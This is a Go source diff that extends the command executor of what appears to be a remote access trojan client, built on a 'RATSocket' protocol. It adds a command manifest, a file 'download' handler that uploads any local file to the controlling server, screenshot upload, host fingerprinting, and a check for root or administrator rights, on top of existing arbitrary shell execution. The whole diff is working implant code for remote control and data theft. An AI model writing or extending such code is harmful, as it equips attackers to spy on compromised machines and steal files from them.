@@ -2,6 +2,7 @@ package executor
 
 import (
 	"bytes"
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -21,6 +22,32 @@ import (
 	"client-go/config"
 	"client-go/protocol"
 )
+
+func DetectHandshakeOSVersion() string {
+	return detectOSVersion()
+}
+
+func DetectHandshakeIntegrity() string {
+	return detectIntegrity()
+}
+
+func CommandManifest() []interface{} {
+	items := []map[string]interface{}{
+		{"name": "help", "help": "Show available commands", "group": "session", "suggest": true},
+		{"name": "kill", "help": "Terminate current session", "group": "session", "suggest": true},
+		{"name": "cd", "help": "Change current working directory", "group": "session", "suggest": true},
+		{"name": "pwd", "help": "Print current working directory", "group": "session", "suggest": true},
+		{"name": "getinfo", "help": "Get system information", "group": "platform", "suggest": true},
+		{"name": "screenshot", "help": "Capture screenshot and upload", "group": "platform", "suggest": true},
+		{"name": "download", "help": "Upload a local file to server", "group": "file", "suggest": true},
+	}
+
+	result := make([]interface{}, 0, len(items))
+	for _, item := range items {
+		result = append(result, item)
+	}
+	return result
+}
 
 type Session struct {
 	Sock             *protocol.RATSocket
@@ -47,6 +74,39 @@ func NewSession(sock *protocol.RATSocket, clientID string) *Session {
 		HostName: host,
 		Cwd:      wd,
 	}
+}
+
+func NewClientID() string {
+	buf := make([]byte, 16)
+	if _, err := io.ReadFull(randReader{}, buf); err != nil {
+		return fmt.Sprintf("fallback-%d", time.Now().UnixNano())
+	}
+
+	buf[6] = (buf[6] & 0x0f) | 0x40
+	buf[8] = (buf[8] & 0x3f) | 0x80
+
+	return fmt.Sprintf("%s-%s-%s-%s-%s",
+		hex.EncodeToString(buf[0:4]),
+		hex.EncodeToString(buf[4:6]),
+		hex.EncodeToString(buf[6:8]),
+		hex.EncodeToString(buf[8:10]),
+		hex.EncodeToString(buf[10:16]),
+	)
+}
+
+type randReader struct{}
+
+func (randReader) Read(p []byte) (int, error) {
+	f, err := os.Open("/dev/urandom")
+	if err == nil {
+		defer f.Close()
+		return f.Read(p)
+	}
+
+	for i := range p {
+		p[i] = byte(time.Now().UnixNano() >> (uint(i%8) * 8))
+	}
+	return len(p), nil
 }
 
 func (s *Session) Dispatch(commandID int, raw string) (int, string) {
@@ -99,6 +159,7 @@ func (s *Session) shell(command string) (int, string) {
 	} else {
 		cmd = exec.Command("sh", "-c", command)
 	}
+
 	if strings.TrimSpace(s.Cwd) != "" {
 		cmd.Dir = s.Cwd
 	}
@@ -157,6 +218,25 @@ func (s *Session) Kill(args []string) (int, string) {
 	return 1, ""
 }
 
+func (s *Session) Help(args []string) (int, string) {
+	lines := []string{
+		"[Session]",
+		fmt.Sprintf("%-24s%s", "help", "Show available commands"),
+		fmt.Sprintf("%-24s%s", "kill", "Terminate current session"),
+		fmt.Sprintf("%-24s%s", "cd <path>", "Change current working directory"),
+		fmt.Sprintf("%-24s%s", "pwd", "Print current working directory"),
+		"",
+		"[Platform]",
+		fmt.Sprintf("%-24s%s", "getinfo", "Get system information"),
+		fmt.Sprintf("%-24s%s", "screenshot", "Capture screenshot and upload"),
+		fmt.Sprintf("%-24s%s", "download <file>", "Upload a local file to server"),
+		"",
+		"[Shell / Execution]",
+		fmt.Sprintf("%-24s%s", "<other command>", "Run in system shell when no builtin matches"),
+	}
+	return 1, strings.Join(lines, "\n")
+}
+
 func (s *Session) Getinfo(args []string) (int, string) {
 	host, _ := os.Hostname()
 	ips := listIPv4Addrs()
@@ -165,12 +245,14 @@ func (s *Session) Getinfo(args []string) (int, string) {
 		"pid":          strconv.Itoa(os.Getpid()),
 		"hostname":     host,
 		"os":           runtime.GOOS,
-		"os_version":   runtime.Version(),
+		"os_version":   detectOSVersion(),
+		"go_version":   runtime.Version(),
 		"architecture": runtime.GOARCH,
 		"cpu_count":    strconv.Itoa(runtime.NumCPU()),
 		"cwd":          s.Cwd,
 		"exec_path":    safeExecutablePath(),
 		"ips":          strings.Join(ips, ", "),
+		"integrity":    detectIntegrity(),
 	}
 
 	if userName := currentUserName(); userName != "" {
@@ -188,6 +270,32 @@ func (s *Session) Screenshot(args []string) (int, string) {
 	defer func() { _ = os.Remove(filePath) }()
 
 	return s.uploadSingleFileToServerResult(filePath, "screenshot")
+}
+
+func (s *Session) Download(args []string) (int, string) {
+	if len(args) == 0 {
+		return 0, "Usage: download <file>"
+	}
+
+	target := strings.TrimSpace(strings.Join(args, " "))
+	if target == "" {
+		return 0, "Usage: download <file>"
+	}
+
+	if !filepath.IsAbs(target) {
+		target = filepath.Join(s.Cwd, target)
+	}
+	target = filepath.Clean(target)
+
+	info, err := os.Stat(target)
+	if err != nil {
+		return 0, fmt.Sprintf("Download failed: %v", err)
+	}
+	if info.IsDir() {
+		return 0, "Download failed: target is a directory"
+	}
+
+	return s.uploadSingleFileToServerResult(target, "download")
 }
 
 func (s *Session) captureScreenshotToTemp() (string, error) {
@@ -215,6 +323,7 @@ func (s *Session) captureScreenshotToTemp() (string, error) {
 	if strings.TrimSpace(s.Cwd) != "" {
 		cmd.Dir = s.Cwd
 	}
+
 	out, err := cmd.CombinedOutput()
 	if err != nil {
 		return "", fmt.Errorf("%v: %s", err, strings.TrimSpace(string(out)))
@@ -314,6 +423,7 @@ func buildUploadSuccessMessage(payload map[string]interface{}, filePath string) 
 	if payload == nil {
 		return ""
 	}
+
 	message := asString(payload["message"])
 	if message == "" {
 		message = "HTTP upload completed"
@@ -419,6 +529,7 @@ func formatDict(values map[string]string) string {
 	if len(values) == 0 {
 		return ""
 	}
+
 	keys := make([]string, 0, len(values))
 	maxLen := 0
 	for key := range values {
@@ -434,4 +545,38 @@ func formatDict(values map[string]string) string {
 		lines = append(lines, fmt.Sprintf("%-*s : %s", maxLen, key, values[key]))
 	}
 	return strings.Join(lines, "\n")
+}
+
+func detectOSVersion() string {
+	switch runtime.GOOS {
+	case "windows":
+		out, err := exec.Command("cmd", "/C", "ver").CombinedOutput()
+		if err == nil {
+			return strings.TrimSpace(string(out))
+		}
+	case "darwin":
+		out, err := exec.Command("sw_vers", "-productVersion").CombinedOutput()
+		if err == nil {
+			return strings.TrimSpace(string(out))
+		}
+	default:
+		if out, err := exec.Command("uname", "-r").CombinedOutput(); err == nil {
+			return strings.TrimSpace(string(out))
+		}
+	}
+	return "unknown"
+}
+
+func detectIntegrity() string {
+	if runtime.GOOS == "windows" {
+		if err := exec.Command("cmd", "/C", "net session >nul 2>&1").Run(); err == nil {
+			return "su"
+		}
+		return "user"
+	}
+
+	if os.Geteuid() == 0 {
+		return "su"
+	}
+	return "user"
 }
